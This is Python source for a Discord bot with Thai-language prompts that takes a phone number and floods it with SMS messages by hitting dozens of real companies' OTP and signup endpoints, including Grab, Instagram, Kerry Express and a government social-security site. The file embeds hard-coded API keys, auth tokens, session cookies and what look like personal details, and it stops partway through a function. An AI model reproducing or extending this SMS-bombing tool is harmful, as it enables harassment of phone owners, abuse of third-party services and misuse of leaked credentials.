import interactions
import requests
import time
import sys
from interactions import Button, ButtonStyle, CommandContext, SelectMenu, SelectOption, ActionRow, Modal, TextInput, TextStyleType, Embed
from concurrent.futures import ThreadPoolExecutor
from interactions import (
    extension_listener,
    extension_component,
    Extension,
    Client,
    ComponentContext,
    Message,
    Channel,
    ChannelType,
    File,
    Member,
)
from random import choice
from string import ascii_uppercase, digits
from re import A, search
from requests import post, Session, get
bot = interactions.Client("",intents=interactions.Intents.DEFAULT | interactions.Intents.GUILD_MESSAGES)
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40"
header = {
    "user-agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
}
threading = ThreadPoolExecutor(max_workers=int(100000))

global data_stop
data_stop = False

@bot.event
async def on_start():
    print("Test")

@bot.event
async def on_message_create(message: Message):
    channel = await message.get_channel()
    if channel.type == ChannelType.DM:
        if message.content == "sms":
            start_spam = Button(
                style=ButtonStyle.SUCCESS,
                custom_id="start_sms",
                label="ยิงเบอร์",
            )
            await message.reply(components=[start_spam])

@bot.component("start_sms")
async def start_sms(ctx: interactions.ComponentContext):
    modal = Modal(
        custom_id="sms",
        title="𝙈𝙚𝙤𝙖𝙬 メ Sms ( Dm )",
        components=[
            TextInput(
                style=TextStyleType.SHORT,
                custom_id="text-input-1",
                label=f"กรุณาใส่เบอร์ที่ต้องการจะยิง",
                placeholder="ex 08********",
            ),
        ],
    )
    await ctx.popup(modal)

@bot.modal("sms")
async def sms(ctx: CommandContext, one):
    global data_stop
    i = 0
    await ctx.send("กำลังเริ่มยิง...")
    time.sleep(1)
    while i < 10:
        if data_stop == True:
            sys.exit()
        elif data_stop == False:
            stop_spam = Button(
                style=ButtonStyle.DANGER,
                custom_id="stop_spam",
                label="หยุดยิง",
            )
            i += 1
            phone = one
            DM_sms(phone)
            await ctx.edit(f"กำลังเริ่มยิงไปที่ {phone} | ความคืบหน้า: {i}0 /100 %",components=[stop_spam])
    else:
        if i == 10:
            end_spam = Button(
                style=ButtonStyle.SUCCESS,
                custom_id="end_spam",
                label="ยิงเสร็จแล้ว !!",
                disabled=True
            )
            await ctx.edit("ยิงเสร็จแล้วครับ !!",components=[end_spam])
        
## Stop Spam ##

@bot.component("stop_spam")
async def stop_spam(ctx: interactions.ComponentContext):
    global data_stop
    if data_stop == False:
        data_stop = True
        end_spam01 = Button(
                style=ButtonStyle.DANGER,
                custom_id="end_spam01",
                label="หยุดยิง",
                disabled=True
            )
        await ctx.edit("หยุดยิงเบอร์ดังกล่าวแล้ว !!",components=[end_spam01])
    elif data_stop == True:
        await ctx.edit("ไม่สามารถหยุดยิงได้ เนื่องจากหยุดยิงอยู่แล้ว !!")
    else:
        await ctx.edit("เกิดข้อผิดพลาด !!")

def randomString(N):
    return ''.join(choice(ascii_uppercase + digits) for _ in range(N))


def sk1(phone):
    post("https://api.myfave.com/api/fave/v3/auth",
         headers={
             "client_id": "dd7a668f74f1479aad9a653412248b62",
             "User-Agent": useragent
         },
         json={"phone": f"66{phone}"})


def sk2(phone):
    post("https://u.icq.net/api/v65/rapi/auth/sendCode",
         headers={"User-Agent": useragent},
         json={
             "reqId": "39816-1633012470",
             "params": {
                 "phone": f"+66{phone[1:]}",
                 "language": "en-US",
                 "route": "sms",
                 "devId": "ic1rtwz1s1Hj1O0r",
                 "application": "icq"
             }
         })


def sk3(phone):
    post("https://api2.1112.com/api/v1/otp/create",
         headers={"User-Agent": useragent},
         data={
             'phonenumber': phone,
             'language': "th"
         })


def sk4(phone):
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone",
         headers={"User-Agent": useragent},
         data={
             "phone": phone,
             "password": "123456789Az"
         })


def sk5(phone):
    post("https://api.1112delivery.com/api/v1/otp/create",
         headers={"User-Agent": useragent},
         data={
             'phonenumber': phone,
             'language': "th"
         })


def sk6(phone):
    post("https://gccircularlivingshop.com/sms/sendOtp",
         headers={"User-Agent": useragent},
         json={
             "grant_type": "otp",
             "username": f"+66{phone[1:]}",
             "password": "",
             "client": "ecommerce"
         })


def sk7(phone):
    post("https://shop.foodland.co.th/login/generation",
         headers={"User-Agent": useragent},
         data={"phone": phone})


def sk8(phone):
    post("https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code",
         headers={"User-Agent": useragent},
         data={"number": f"+66{phone[1:]}"})


def sk9(phone):
    post("https://api.sacasino9x.com/api/RegisterService/RequestOTP",
         headers={"User-Agent": useragent},
         json={"Phone": phone})


def sk10(phone):
    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp",
         headers={"User-Agent": useragent},
         data={"phone": phone})


def sk11(phone):
    post(
        "https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code",
        headers={"User-Agent": useragent},
        data={"phone": phone})


def sk12(phone):
    post(
        "https://partner-api.grab.com/grabid/v1/oauth2/otp",
        headers={"User-Agent": useragent},
        json={
            "client_id": "4ddf78ade8324462988fec5bfc5874c2",
            "transaction_ctx": "null",
            "country_code": "TH",
            "method": "SMS",
            "num_digits": "6",
            "scope":
            "openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile",
            "phone_number": f"66{phone[1:]}"
        })


def sk13(phone):
    post("https://api.scg-id.com/api/otp/send_otp",
         headers={
             "User-Agent": useragent,
             "Content-Type": "application/json;charset=UTF-8"
         },
         json={"phone_no": phone})


def sk14(phone):
    session = Session()
    searchItem = session.get("https://www.shopat24.com/register/").text
    ReqTOKEN = search("""<input type="hidden" name="_csrf" value="(.*)" />""",
                      searchItem).group(1)
    session.post("https://www.shopat24.com/register/ajax/requestotp/",
                 headers={
                     "User-Agent": useragent,
                     "content-type":
                     "application/x-www-form-urlencoded; charset=UTF-8",
                     "X-CSRF-TOKEN": ReqTOKEN
                 },
                 data={"phoneNumber": phone})


def sk15(phone):
    post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send",
         headers={"User-Agent": useragent},
         data={
             "tel": phone,
             "otp_type": "register"
         })


def sk16(phone):
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
         headers={"User-Agent": useragent},
         json={
             "on": {
                 "value": phone,
                 "country": "66"
             },
             "type": "mobile"
         })


def sk17(phone):
    post(
        f"https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/{phone}",
        headers={"User-Agent": useragent})


def sk18(phone):
    post(
        "https://graph.firster.com/graphql",
        headers={
            "User-Agent": useragent,
            "organizationcode": "lifestyle",
            "content-type": "application/json"
        },
        json={
            "operationName":
            "sendOtp",
            "variables": {
                "input": {
                    "mobileNumber": phone[1:],
                    "phoneCode": "THA-66"
                }
            },
            "query":
            "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"
        })


def sk19(phone):
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661",
         headers={"User-Agent": useragent},
         json={
             "lang": "th",
             "userType": "BUYER",
             "locale": "th",
             "orgIdfier": "scg",
             "phone": f"+66{phone[1:]}",
             "type": "signup",
             "otpTemplate": "buyer_signup_otp_message",
             "userParams": {
                 "buyerName": randomString(10)
             }
         })


def sk20(phone):
    post("https://store.boots.co.th/api/v1/guest/register/otp",
         headers={"User-Agent": useragent},
         json={"phone_number": f"+66{phone[1:]}"})


def sk21(phone):
    post("https://m.lucabet168.com/api/register-otp",
         headers={"User-Agent": useragent},
         json={
             "brands_id": "609caede5a67e5001164b89d",
             "agent_register": "60a22f7d233d2900110070d7",
             "tel": phone
         })


def sk22(phone):
    session = Session()
    ReqTOKEN = session.get(
        "https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?redirect_uri=https%3A%2F%2Faisplay.ais.co.th%2Fportal%2Fcallback%2Ffungus%2Fany&httpGenerate=generated",
        headers={
            "User-Agent": useragent
        }).text
    session.post(
        "https://srfng.ais.co.th/login/sendOneTimePW",
        data=
        f"msisdn=66{phone[1:]}&serviceId=AISPlay&accountType=all&otpChannel=sms",
        headers={
            "User-Agent":
            useragent,
            "Content-Type":
            "application/x-www-form-urlencoded; charset=UTF-8",
            "authorization":
            f'''Bearer {search("""<input type="hidden" id='token' value="(.*)">""", ReqTOKEN).group(1)}'''
        })


def sk23(phone):
    post(url="https://www.cpffeedonline.com/Customer/RegisterRequestOTP",
         data={"mobileNumber": f"{phone}"})


def sk24(phone):
    post(url="https://www.tgfone.com/index.php/signin/otp_chk",
         data={"mobile": f"{phone}"})


def sk25(phone):
    post(
        "https://api2.1112.com/api/v1/otp/create",
        json={
            "phonenumber": f"0{phone}",
            "language": "th"
        },
        headers={
            "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
        })


def sk26(phone):
    post(
        "https://unacademy.com/api/v3/user/user_check/",
        json={
            "phone": f"0{phone}",
            "country_code": "TH"
        },
        headers={
            "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
        })


def sk27(phone):
    post(
        f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-0{phone}"
    )


def sk28(phone):
    post(
        "https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
        json={
            "username": f"0{phone}",
            "password": "6302814184624az",
            "name": "0903281894",
            "provinceCode": "28",
            "districtCode": "393",
            "subdistrictCode": "3494",
            "zipcode": "40260",
            "siebelCustomerTypeId": "710",
            "acceptTermAndCondition": "true",
            "hasSeenConsent": "false",
            "locale": "th_TH"
        },
        headers={
            "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
        })


def sk29(phone):
    post(
        "https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp",
        data={"phone": f"0{phone}"},
        headers={
            "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
        })


def sk30(phone):
    post(
        "https://www.berlnw.com/reservelogin",
        data={"p_myreserve": f"0{phone}"},
        headers={
            "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
        })


def sk31(phone):
    post(
        "https://www.kickoff28.com/action.php?mode=PreRegister",
        data={"tel": f"0{phone}"},
        headers={
            "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
        })


def sk32(phone):
    post(
        "https://1ufabet.com/_ajax_/request-otp",
        data={
            "request_otp[phoneNumber]": f"0{phone}",
            "request_otp[termAndCondition]": "1",
            "request_otp[_token]":
            "XBNcvQIzJK1pjh_2T0BBzLiDa6vSivktDN317mbw3ws"
        },
        headers={
            "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"
        })


def p1112(phone):
    d = post('https://api2.1112.com/api/v1/otp/create',
             json={
                 "phonenumber": phone,
                 "language": "th"
             },
             headers=header).status_code


def p1112v2(phone):
    d = post('https://api.1112delivery.com/api/v1/otp/create',
             json={
                 "phonenumber": phone,
                 "language": "th"
             },
             headers=header).status_code


def yandex(phone):
    d = post("https://taxi.yandex.kz/3.0/launch/", json={},
             headers=header).json()
    d = post("https://taxi.yandex.kz/3.0/auth/",
             json={
                 "id": d["id"],
                 "phone": f"+66{phone[1:]}"
             },
             headers=header).text


def okru(phone):
    s = Session()
    s.headers.update({
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38",
        "Content-Type":
        "application/x-www-form-urlencoded",
        "Accept":
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
    })
    s.post(
        "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
        data=f"st.r.phone=+66{phone[1:]}")
    s.post(
        "https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",
        data="st.r.fieldAcceptCallUIButton=Call")


def karusel(phone):
    s = Session()
    s.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})


def KFC(_phone):
    post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms',
         json={'phone': '+' + _phone})


def icq(phone):
    post(f"https://u.icq.net/api/v4/rapi",
         json={
             "method": "auth/sendCode",
             "reqId": "24973-1587490090",
             "params": {
                 "phone": f"66{phone[1:]}",
                 "language": "en-US",
                 "route": "sms",
                 "devId": "ic1rtwz1s1Hj1O0r",
                 "application": "icq"
             }
         },
         headers=header)


def findclone(phone):
    d = get(
        f"https://findclone.ru/register?phone=+66{phone[1:]}",
        headers={
            "X-Requested-With":
            "XMLHttpRequest",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36"
        }).json()


def spam_pizza(phone):  #pizza
    post('https://api2.1112.com/api/v1/otp/create',
         data={
             'phonenumber': phone,
             'language': "th"
         })


def youla(phone):
    post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})


def ig_token():
    d = get("https://www.instagram.com/", headers=header).headers['set-cookie']
    d = search("csrftoken=(.*);", d).group(1).split(";")
    return d[0], d[10].replace(" Secure, ig_did=", "")


def Facebook(phone):
    token, _ = ig_token()
    d = post(
        "https://www.instagram.com/accounts/account_recovery_send_ajax/",
        data=f"email_or_username=66{phone}&recaptcha_challenge_field=",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
            "X-CSRFToken": token
        }).json()


def instagram(phone):
    token, cid = ig_token()
    d = post(
        "https://www.instagram.com/accounts/send_signup_sms_code_ajax/",
        data=
        f"client_id={cid}&phone_number=66{phone}&phone_id=&big_blue_token=",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
            "X-CSRFToken": token
        }).json()


def Rapid(phone):
    d = post('https://rapidapi.com/blaazetech/api/spam-caller-check/',
             json={
                 "phonenumber": phone,
                 "language": "th"
             },
             headers=header).status_code


def VBC(phone):
    post('https://twitter-user-profile-data.p.rapidapi.com/v1/api/twitter',
         headers={
             'content-type': "application/json",
             'x-rapidapi-host': "twitter-user-profile-data.p.rapidapi.com",
             'x-rapidapi-key':
             "775b9796aemshb6a4eefc8d0e33cp1d04d7jsnefd368e22b03"
         })


def api1(phone):
    post(
        "https://m.thisshop.com/cos/send/code/notice",
        json={
            "sessionContext": {
                "channel": "h5",
                "entityCode": 0,
                "userReferenceNumber": "12w12y11r52gz259ue14rr7g7370239m",
                "localDateTimeText": "20220115182850",
                "riskMessage": "{}",
                "serviceCode": "FLEX0001",
                "superUserId": "sysadmin",
                "tokenKey": "149d5c7bae10304c8aba0da2bbc59cb7",
                "authorizationReason": "",
                "transactionBranch": "TFT_ORG_0000",
                "userId": "",
                "locale": "th-TH"
            },
            "noticeType": 1,
            "businessType": "RT0001",
            "phoneNumber": f"66-{phone}"
        },
        headers={
            "content-type":
            "application/json; charset=UTF-8",
            "user-agent":
            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"
        })


def api2(phone):
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "user-agent":
        "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
        "referer":
        "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",
        "cookie": "_gcl_au=1.1.1123274548.1637746846"
    }
    post(
        "https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",
        headers=headers,
        data=f"phoneno={phone}&retrycount=0")


def api3(phone):
    post("https://gettgo.com/sessions/otp_for_sign_up",
         data={"mobile_number": phone})


def api4(phone):
    post(
        "https://api.true-shopping.com/customer/api/request-activate/mobile_no",
        data={"username": phone})


def api5(phone):
    post("https://www.msport1688.com/auth/send_otp", data={"phone": phone})


def api6(phone):
    post("http://b226.com/x/code", data={f"phone": phone})


def api7(phone):
    post(
        'https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',
        headers={
            "User-Agent":
            "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
            "Content-Type":
            "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With":
            "XMLHttpRequest",
            "Cookie":
            "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"
        },
        data=
        f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER"
    )


def api8(phone):
    post(
        "https://api.mcshop.com/cognito/me/forget-password",
        headers={
            "x-store-token": "mcshop",
            "user-agent":
            "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "accept": "application/json, text/plain, */*",
            "x-auth-token":
            "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7",
            "x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"
        },
        json={"username": phone})


def api9(phone):
    get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register"
        )


def api10(phone):
    post(
        "https://m.lavagame168.com/api/register-otp",
        headers={
            "x-exp-signature": "5ffc0caa4d603200124e4eb1",
            "user-agent":
            "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
            "referer": "https://m.lavagame168.com/dashboard/login"
        },
        json={
            "brands_id": "5ffc0caa4d603200124e4eb1",
            "agent_register": "5ffc0d5cdcd4f30012aec3d9",
            "tel": phone
        })


def api11(phone):
    get("https://m.redbus.id/api/getOtp?number=" + phone[1:] +
        "&cc=66&whatsAppOpted=true",
        headers={
            "traceparent":
            "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01",
            "user-agent":
            "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"
        }).text


def api12(phone):
    post("https://api.myfave.com/api/fave/v3/auth",
         headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},
         json={"phone": "66" + phone})


def api13(phone):
    post(
        "https://samartbet.com/api/request/otp",
        data={
            "phoneNumber":
            phone,
            "token":
            "HFbWhpfhFIGSMVWlhcQ0JNQgAtJ3g3QT43FRpzKhsvGhoHEzo6C1sjaRh1dSxgfEt_URwOHgwabwwWKXgodXd9IBBtZShlPx9rQUNiek5tYDtfB3swTC4KUlVRX0cFWVkNElhjPXVzb3NWBSpvVzofb1ZFLi15c2YrTltsL0FpGSMVGQ9rCRsacxJcemxjajdoch8sfEhoWVlvbVEsQ0tWfhgfOGth"
        })


def api14(phone):
    post("https://www.msport1688.com/auth/send_otp", data={"phone": phone})


def api15(phone):
    post("http://b226.com/x/code", data={f"phone": phone})


def api16(phone):
    post("https://ep789bet.net/auth/send_otp", data={"phone": phone})


def api17(phone):
    post(
        "https://www.berlnw.com/reservelogin",
        data={"p_myreserve": phone},
        headers={
            "Host":
            "www.berlnw.com",
            "Connection":
            "keep-alive",
            "Upgrade-Insecure-Requests":
            "1",
            "Content-Type":
            "application/x-www-form-urlencoded",
            "Save-Data":
            "on",
            "Accept":
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Referer":
            "https://www.berlnw.com/myaccount",
            "Accept-Encoding":
            "gzip, deflate, br",
            "Accept-Language":
            "th-TH,th;q=0.9,en;q=0.8",
            "Cookie":
            "berlnw=s%3AaKEA2ULex-QQ7U6jr0WCQGs-Mz3eJFJn.RsAXcleV2EVFN4j%2BPqDivbqSYAta0UYtyoM65BrxuV0; _referrer_og=https%3A%2F%2Fwww.google.com%2F; _first_pageview=1; _jsuid=4035440860; _ga=GA1.2.766623232.1635154743; _gid=GA1.2.1857466267.1635154743; _gac_UA-90695720-1=1.1635154743.CjwKCAjwq9mLBhB2EiwAuYdMtU_gp7mSvFcH4kByOTGf-LsmLTGujv9qCwMi1xwWSuEiQSOlODmN-RoCMu4QAvD_BwE; _fbp=fb.1.1635154742776.771793600; _gat_gtag_UA_90695720_1=1"
        })


def api18(phone):
    post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP",
         json={
             "on": {
                 "value": phone,
                 "country": "66"
             },
             "type": "mobile"
         })


def api19(phone):
    post(
        f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-{phone}"
    )


def api20(phone):
    post("https://shop.foodland.co.th/login/generation", data={"phone": phone})


def api21(phone):
    post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number": phone})


def api22(phone):
    post("https://unacademy.com/api/v3/user/user_check/",
         json={
             "phone": phone,
             "country_code": "TH"
         },
         headers={}).json()


def api23(phone):
    post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp",
         data={"phone": phone})


def api24(phone):
    post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",
         json={
             "username": phone,
             "password": "6302814184624az",
             "name": "0903281894",
             "provinceCode": "28",
             "districtCode": "393",
             "subdistrictCode": "3494",
             "zipcode": "40260",
             "siebelCustomerTypeId": "710",
             "acceptTermAndCondition": "true",
             "hasSeenConsent": "false",
             "locale": "th_TH"
         })


def api25(phone):
    post("https://store.boots.co.th/api/v1/guest/register/otp",
         json={"phone_number": phone})


def api26(phone):
    post(
        "https://www.instagram.com/accounts/account_recovery_send_ajax/",
        data=f"email_or_username={phone}&recaptcha_challenge_field=",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
            "x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"
        }).json


def api27(phone):
    post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/" +
         phone)


def api28(phone):
    post("https://api.scg-id.com/api/otp/send_otp",
         headers={"Content-Type": "application/json;charset=UTF-8"},
         json={"phone_no": phone})


def api29(phone):
    post(
        "https://partner-api.grab.com/grabid/v1/oauth2/otp",
        json={
            "client_id": "4ddf78ade8324462988fec5bfc5874c2",
            "transaction_ctx": "null",
            "country_code": "TH",
            "method": "SMS",
            "num_digits": "6",
            "scope":
            "openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile",
            "phone_number": phone
        },
        headers={})


def api30(phone):
    post(
        "https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code",
        data={"phone": phone})


def api31(phone):
    post("https://ecomapi.eveandboy.com/v10/user/signup/phone",
         data={
             "phone": phone,
             "password": "123456789Az"
         })


def api32(phone):
    post(
        "https://cognito-idp.ap-southeast-1.amazonaws.com/",
        headers={
            "user-agent":
            "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
            "content-type": "application/x-amz-json-1.1",
            "x-amz-target": "AWSCognitoIdentityProviderService.SignUp",
            "x-amz-user-agent": "aws-amplify/0.1.x js",
            "referer": "https://www.bugaboo.tv/members/signup/phone"
        },
        json={
            "ClientId":
            "6g47av6ddfcvi06v4l186c16d6",
            "Username":
            f"+66{phone[1:]}",
            "Password":
            "098098Az",
            "UserAttributes": [{
                "Name": "name",
                "Value": "Dbdh"
            }, {
                "Name": "birthdate",
                "Value": "2005-01-01"
            }, {
                "Name": "gender",
                "Value": "Male"
            }, {
                "Name": "phone_number",
                "Value": f"+66{phone[1:]}"
            }, {
                "Name": "custom:phone_country_code",
                "Value": "+66"
            }, {
                "Name": "custom:is_agreement",
                "Value": "true"
            }, {
                "Name": "custom:allow_consent",
                "Value": "true"
            }, {
                "Name": "custom:allow_person_info",
                "Value": "true"
            }],
            "ValidationData": []
        })
    post(
        "https://cognito-idp.ap-southeast-1.amazonaws.com/",
        headers={
            "cache-control": "max-age=0",
            "user-agent":
            "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
            "content-type": "application/x-amz-json-1.1",
            "x-amz-target":
            "AWSCognitoIdentityProviderService.ResendConfirmationCode",
            "x-amz-user-agent": "aws-amplify/0.1.x js",
            "referer": "https://www.bugaboo.tv/members/resetpass/phone"
        },
        json={
            "ClientId": "6g47av6ddfcvi06v4l186c16d6",
            "Username": f"+66{phone[1:]}"
        })


def api33(phone):
    get(f"https://laopun.com/send-sms?id={phone}&otp=5153", headers=header)


def api34(phone):
    post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number": phone})


def api35(phone):
    post("https://www.carsome.co.th/website/login/sendSMS",
         headers=header,
         json={
             "username": phone,
             "optType": 0
         }).json()


def api36(phone):
    post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",
         headers=header,
         json={
             "lang": "th",
             "userType": "BUYER",
             "locale": "th",
             "orgIdfier": "scg",
             "phone": phone,
             "type": "signup",
             "otpTemplate": "buyer_signup_otp_message",
             "userParams": {
                 "buyerName": "ฟงฟง ฟงฟว"
             }
         })


def api37(phone):
    post("https://u.icq.net/api/v65/rapi/auth/sendCode",
         json={
             "reqId": "39816-1633012470",
             "params": {
                 "phone": phone,
                 "language": "en-US",
                 "route": "sms",
                 "devId": "ic1rtwz1s1Hj1O0r",
                 "application": "icq"
             }
         })


def api38(phone):
    post("https://api.1112delivery.com/api/v1/otp/create",
         data={
             'phonenumber': phone,
             'language': "th"
         })


def api39(phone):
    post("https://gccircularlivingshop.com/sms/sendOtp",
         json={
             "grant_type": "otp",
             "username": phone,
             "password": "",
             "client": "ecommerce"
         },
         headers={})


def api40(phone):
    headers = {
        "organizationcode": "lifestyle",
        "content-type": "application/json"
    }
    json = {
        "operationName":
        "sendOtp",
        "variables": {
            "input": {
                "mobileNumber": phone,
                "phoneCode": "THA-66"
            }
        },
        "query":
        "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"
    }
    post("https://graph.firster.com/graphql", headers=headers, json=json)


def api41(phone):
    post("https://m.riches666.com/api/register-otp",
         data={
             "brands_id": "60a6563a232a600012521982",
